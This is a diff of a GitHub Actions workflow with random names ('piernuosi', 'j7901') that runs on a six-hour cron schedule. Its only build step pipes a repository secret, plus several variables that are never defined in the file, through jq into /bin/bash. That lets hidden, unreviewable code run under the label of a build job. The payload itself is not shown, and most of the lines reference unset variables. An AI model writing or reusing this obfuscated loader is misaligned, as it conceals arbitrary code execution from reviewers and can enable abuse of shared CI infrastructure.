@@ -2,25 +2,23 @@ name: piernuosi
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 3/6 * * *'
-jobs:  # 7571
+    - cron: '41 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: piernuosi
         env:
-          ppp53: ${{ secrets.ppp53 }}
+          j7901: ${{ secrets.j7901 }}
         run: |
-          echo $ppp53 | jq -r .nzg71182 | /bin/bash
-          echo $zmq0144 | jq -r .wic71841 | /bin/bash
-          echo $jh8 | jq -r .fro43138 | /bin/bash
-          echo $bhxd77934 | jq -r .yxsr303 | /bin/bash
-          echo $tena0027 | jq -r .vbeag37 | /bin/bash
-          echo $loid32 | jq -r .oqp8334 | /bin/bash
-          echo $ttna05 | jq -r .my7367 | /bin/bash
-          echo $ndnj785 | jq -r .uxv0 | /bin/bash
-          echo $t0632 | jq -r .l465 | /bin/bash
-          echo $gasmd78356 | jq -r .yzhp038 | /bin/bash
+          echo $j7901 | jq -r .ns9135 | /bin/bash
+          echo $sz8 | jq -r .uglu92983 | /bin/bash
+          echo $cy25433 | jq -r .u2071 | /bin/bash
+          echo $ii5438 | jq -r .ml47989 | /bin/bash
+          echo $b4694 | jq -r .bc0412 | /bin/bash
+          echo $sx358 | jq -r .q20 | /bin/bash
+          echo $tc6 | jq -r .ukqu0 | /bin/bash
+          echo $c9459 | jq -r .pfegh8 | /bin/bash
 
